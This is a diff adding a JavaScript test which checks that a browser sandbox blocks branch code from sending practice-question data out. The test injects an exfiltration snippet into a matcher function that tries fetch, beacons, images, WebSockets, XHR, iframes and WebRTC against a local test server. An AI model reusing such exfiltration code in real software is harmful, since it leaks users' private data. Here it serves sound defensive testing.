@@ -363,3 +363,53 @@ describe("the renderer draws only with the tree's own packages", () => {
     } finally { rmSync(root, { recursive: true, force: true }); }
   }, 120_000);
 });
+
+/* Luna, PR #155 review: the pairing job hands practice questions to the
+   branch's matcher in the browser, and nothing stopped that code sending
+   them out. The sandbox page now has no network at all. */
+describe("the sandbox cannot send anything out", () => {
+  it("blocks fetch, beacons, images, sockets and WebRTC from branch code", async () => {
+    const { createServer } = await import("node:http");
+    const { cpSync } = require("node:fs");
+    const hits = [];
+    const server = createServer((req, res) => { hits.push(req.url); res.end("ok"); });
+    await new Promise((r) => server.listen(0, "127.0.0.1", r));
+    const url = `http://127.0.0.1:${server.address().port}`;
+    const root = mkdtempSync(join(tmpdir(), "exfil-"));
+    /* Direct connections, so the control below proves the server is
+       reachable from this browser and the sandbox result means something. */
+    const proxy = { HTTPS_PROXY: process.env.HTTPS_PROXY, https_proxy: process.env.https_proxy };
+    delete process.env.HTTPS_PROXY; delete process.env.https_proxy;
+    try {
+      cpSync("src", join(root, "src"), { recursive: true });
+      cpSync("package.json", join(root, "package.json"));
+      cpSync("package-lock.json", join(root, "package-lock.json"));
+      const m = join(root, "src/diagrams/match.js");
+      writeFileSync(m, readFileSync(m, "utf8").replace("export function proposePairs(item) {", `export function proposePairs(item) {
+  const leak = encodeURIComponent(JSON.stringify(item));
+  try { fetch("${url}/fetch?" + leak).catch(() => {}); } catch {}
+  try { navigator.sendBeacon("${url}/beacon", leak); } catch {}
+  try { new Image().src = "${url}/img?" + leak; } catch {}
+  try { const ws = new WebSocket("${url.replace("http", "ws")}/ws"); } catch {}
+  try { const x = new XMLHttpRequest(); x.open("GET", "${url}/xhr?" + leak); x.send(); } catch {}
+  try { const f = document.createElement("iframe"); f.src = "${url}/frame?" + leak; document.body.appendChild(f); } catch {}
+  try { new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${server.address().port}" }] }); } catch {}`));
+      const { withSandbox } = await import("../ops/render-diagrams.mjs");
+      const out = await withSandbox(root, async (call) => {
+        const p = await call("propose", [{ id: 1, stem: "SECRET STEM potassium 6.2", options: ["a"], rationale: "SECRET RATIONALE" }]);
+        await new Promise((r) => setTimeout(r, 1500));
+        return p;
+      });
+      expect(out["1"]).toBeTruthy();   // the matcher still ran
+      expect(hits, "nothing left the sandbox").toEqual([]);
+      // control: an ordinary page in the same browser can reach the server
+      const { launchBrowser } = await import("../ops/browser.mjs");
+      const b = await launchBrowser();
+      try { const pg = await (await b.newContext()).newPage(); await pg.goto(`${url}/control`); } finally { await b.close(); }
+      expect(hits).toContain("/control");
+    } finally {
+      for (const [k, v] of Object.entries(proxy)) if (v !== undefined) process.env[k] = v;
+      server.close(); rmSync(root, { recursive: true, force: true });
+    }
+  }, 180_000);
+});
